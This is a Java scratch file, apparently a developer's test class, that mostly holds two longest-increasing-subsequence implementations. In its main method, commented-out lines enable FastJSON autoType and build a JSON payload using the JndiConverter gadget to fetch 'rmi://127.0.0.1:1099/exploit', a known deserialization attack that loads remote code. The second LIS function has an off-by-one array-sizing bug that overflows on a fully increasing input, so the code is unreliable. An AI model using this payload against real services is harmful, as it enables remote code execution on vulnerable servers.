package com.wy.hodgepodges.demo;

/**
 * @author wy
 * @version V1.0
 * @desc
 * @date 2020/6/9 11:29 下午
 */
public class FastJsonTest {
    public static void main(String[] args) {
//        JndiConverter a = new JndiConverter();
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String text1 = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1099/exploit\"}";
//
//        JSONObject object = JSON.parseObject(text1);
        int[] num = {2, 4, 1, 4, 4, 5, 6, 7, 1};
        System.out.println(lengthOfddLIS(num));

    }

    public static int lengthOfLIS(int[] nums) {
        if (nums.length == 0) {
            return 0;
        }
        int[] dp = new int[nums.length];
        dp[0] = 1;
        int maxans = 1;
        for (int i = 1; i < dp.length; i++) {
            int maxval = 0;
            for (int j = 0; j < i; j++) {
                if (nums[i] > nums[j]) {
                    maxval = Math.max(maxval, dp[j]);
                }
            }
            dp[i] = maxval + 1;
            maxans = Math.max(maxans, dp[i]);
        }
        return maxans;
    }

    public static int lengthOfddLIS(int[] nums) {
        int len = 1, n = nums.length;
        if (n == 0) return 0;
        int[] d= new int[n];
        d[len] = nums[0];
        for (int i = 1; i < n; ++i) {
            if (nums[i] > d[len]) d[++len] = nums[i];
            else {
                int l = 1, r = len, pos = 0; // 如果找不到说明所有的数都比 nums[i] 大，此时要更新 d[1]，所以这里将 pos 设为 0
                while (l <= r) {
                    int mid = (l + r) >> 1;
                    if (d[mid] < nums[i]) {
                        pos = mid;
                        l = mid + 1;
                    } else r = mid - 1;
                }
                d[pos + 1] = nums[i];
            }
        }
        return len;
    }


}

